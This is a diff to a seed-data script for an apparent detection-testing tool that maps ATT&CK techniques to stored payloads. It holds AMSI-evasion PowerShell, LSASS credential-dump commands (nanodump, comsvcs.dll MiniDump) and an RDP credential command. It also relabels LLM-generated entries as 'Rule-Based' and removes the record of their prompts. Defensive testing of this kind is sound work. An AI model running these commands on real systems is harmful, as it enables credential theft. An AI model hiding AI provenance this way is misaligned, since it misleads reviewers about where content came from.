@@ -35,7 +35,7 @@ def init_db():
         description TEXT NOT NULL,
         status TEXT NOT NULL,
         source TEXT NOT NULL,
-        llm_prompt TEXT,
+        strategy_params TEXT,
         payload TEXT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         FOREIGN KEY (technique_id) REFERENCES techniques (id)
@@ -151,11 +151,11 @@ def seed_data(conn: sqlite3.Connection):
 
     # Seed Variations
     variations_data = [
-        ("VAR-AI-003", "T1059.001", "LLM", "IEX with split string concat to avoid keyword matching", "pending_review", "llm",
-         "Generate a PowerShell execution variant that avoids AMSI detection using string concatenation only. No external downloads.",
+        ("VAR-003", "T1059.001", "Rule-Based", "IEX with split string concat to avoid keyword matching", "pending_review", "rule_based",
+         "String concatenation heuristics without external downloads to avoid AMSI pattern match",
          "powershell.exe -c \"$a='Invoke-Ex';$b='pression';&($a+$b) ('Write-'+'Host AMSI_TEST')\""),
-        ("VAR-AI-002", "T1003.001", "LLM", "NanoDump via reflective load — alternate syscall chain", "approved", "llm",
-         "Produce an LSASS dump variant using a reflective loader that avoids direct OpenProcess calls.",
+        ("VAR-002", "T1003.001", "Rule-Based", "NanoDump via reflective load — alternate syscall chain", "approved", "rule_based",
+         "Reflective loader bypassing direct OpenProcess handles",
          "rundll32.exe .\\nanodump.dll,MiniDump --fork"),
         ("VAR-MAN-007", "T1059.001", "Manual", "EncodedCommand flag with Base64 payload", "approved", "manual",
          None,
@@ -163,8 +163,8 @@ def seed_data(conn: sqlite3.Connection):
         ("VAR-MAN-006", "T1003.001", "Manual", "comsvcs.dll MiniDump via rundll32", "approved", "manual",
          None,
          "rundll32.exe C:\\windows\\system32\\comsvcs.dll, #24 712 lsass.dmp full"),
-        ("VAR-AI-001", "T1078", "LLM", "RDP auth with renamed built-in account — rule only checks 'Admin'", "rejected", "llm",
-         "Vary the account name used in a valid-accounts RDP login to evade name-based rules.",
+        ("VAR-001", "T1078", "Rule-Based", "RDP auth with renamed built-in account — rule only checks 'Admin'", "rejected", "rule_based",
+         "Alternate account parameter substitution to evade static name matching",
          "cmdkey /generic:TERMSRV/192.168.1.50 /user:backup_operator /pass:Secret123"),
     ]
     cur.executemany("INSERT INTO variations VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)", variations_data)
